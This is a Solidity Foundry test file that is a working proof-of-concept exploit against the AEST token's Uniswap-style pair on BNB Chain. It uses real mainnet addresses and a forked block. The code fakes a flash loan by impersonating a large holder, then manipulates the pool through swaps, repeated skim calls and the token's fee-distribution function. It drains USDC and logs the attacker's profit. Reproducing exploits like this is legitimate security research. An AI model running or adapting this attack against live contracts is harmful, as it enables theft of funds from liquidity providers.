// SPDX-License-Identifier: MIT
pragma solidity =0.8.4;

import "../src/AEST.sol";
import "../lib/forge-std/src/Test.sol";

contract AESTTest is Test {
    IUniswapV2Pair pair;
    IUniswapV2Router02 router;
    AEST token;
    ERC20 USDC;
    address Binance;

    function setUp() public {
        vm.createSelectFork(
        "https://rpc.ankr.com/bsc",
        23695904
        );
        router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IUniswapV2Pair(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3);
        token = AEST(payable(0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907));
        USDC = ERC20(0x55d398326f99059fF775485246999027B3197955);
        Binance = 0xEB2d2F1b8c558a40207669291Fda468E50c8A0bB;
    }

    function testTokenPoC() public {
        PoC();
    }

    function PoC() public {
        // mock flashloan call
        vm.prank(Binance);
        USDC.transfer(address(this), 1500_000*10**18);
        USDC.approve(address(router), ~uint256(0));
        token.approve(address(router),~uint256(0));

        console.log("Pair USDC balanceBefore is ", USDC.balanceOf(address(pair))/10**18);

        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(token);

        token.distributeFee();
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1500_000*10**18,
            0,
            path,
            address(this),
            block.timestamp + 1000
        );

        uint256 mytoken = token.balanceOf(address(this));
        uint256 pairtoken = token.balanceOf(address(pair));


        uint256 fee;
        fee = token.swapFeeTotal();
        if(((mytoken)*9/106 ) >= pairtoken*99999/100000) {
            token.transfer(address(pair), pairtoken);
        } else {
            token.transfer(address(pair), mytoken*77632/100000);
            while (fee >= pairtoken * 99999/100000) {
                pair.skim(address(pair));
                fee = token.swapFeeTotal();
            }
        }

        pair.skim(address(this));
        token.distributeFee();
        pair.sync();

        path[0] = address(token);
        path[1] = address(USDC);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            token.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 1000
        );


        // mock flashloan call end
        USDC.transfer(Binance, 1500_000*10**18);
        require(USDC.balanceOf(address(this))>0, "Err for attacked!");
        console.log("Pair USDC balanceAfter is ", USDC.balanceOf(address(pair))/10**18);
        console.log("My USDC balance is ", USDC.balanceOf(address(this))/10**18);
    }
}
